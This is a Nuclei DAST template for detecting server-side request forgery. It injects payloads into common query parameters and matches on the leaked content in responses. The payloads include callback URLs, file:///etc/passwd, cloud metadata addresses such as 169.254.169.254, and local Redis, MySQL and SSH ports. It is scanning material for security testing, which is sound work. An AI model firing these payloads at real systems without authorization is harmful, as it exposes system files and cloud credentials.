http:
- fuzzing:
  - fuzz:
    - '{{ssrf}}'
    keys:
    - callback
    - continue
    - data
    - dest
    - dir
    - domain
    - feed
    - file
    - host
    - html
    - imgurl
    - navigation
    - next
    - open
    - out
    - page
    - path
    - port
    - redirect
    - reference
    - return
    - show
    - site
    - to
    - uri
    - url
    - val
    - validate
    - view
    - window
    mode: single
    part: query
  - fuzz:
    - '{{ssrf}}'
    mode: single
    part: query
    values:
    - (https|http|file)(%3A%2F%2F|://)(.*?)
  matchers:
  - part: body
    type: word
    words:
    - Interactsh Server
  - part: body
    regex:
    - SSH-(\d.\d)-OpenSSH_(\d.\d)
    type: regex
  - part: body
    regex:
    - (DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)
    type: regex
  - part: body
    regex:
    - (\d.\d.\d)(.*?)mysql_native_password
    type: regex
  - part: body
    regex:
    - 'root:.*?:[0-9]*:[0-9]*:'
    type: regex
  - part: body
    type: word
    words:
    - for 16-bit app support
  - part: body
    regex:
    - dns-conf\/[\s\S]+instance\/
    type: regex
  - part: body
    regex:
    - app-id[\s\S]+placement\/
    type: regex
  - part: body
    regex:
    - ami-id[\s\S]+placement\/
    type: regex
  - part: body
    regex:
    - id[\s\S]+interfaces\/
    type: regex
  matchers-condition: or
  payloads:
    ssrf:
    - http://{{interactsh-url}}
    - http://{{FQDN}}.{{interactsh-url}}
    - http://{{FQDN}}@{{interactsh-url}}
    - http://{{interactsh-url}}#{{FQDN}}
    - http://{{RDN}}.{{interactsh-url}}
    - http://{{RDN}}@{{interactsh-url}}
    - http://{{interactsh-url}}#{{RDN}}
    - file:////./etc/./passwd
    - file:///c:/./windows/./win.ini
    - http://metadata.tencentyun.com/latest/meta-data/
    - http://100.100.100.200/latest/meta-data/
    - http://169.254.169.254/latest/meta-data/
    - http://169.254.169.254/metadata/v1
    - http://127.0.0.1:22
    - http://127.0.0.1:3306
    - dict://127.0.0.1:6379/info
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
  stop-at-first-match: true
id: response-ssrf
info:
  author: pdteam,pwnhxl,j4vaovo,AmirHossein Raeisi
  metadata:
    max-request: 12
  name: Full Response SSRF Detection
  reference:
  - https://github.com/bugcrowd/HUNT/blob/master/ZAP/scripts/passive/SSRF.py
  severity: high
  tags: ssrf,dast,vuln
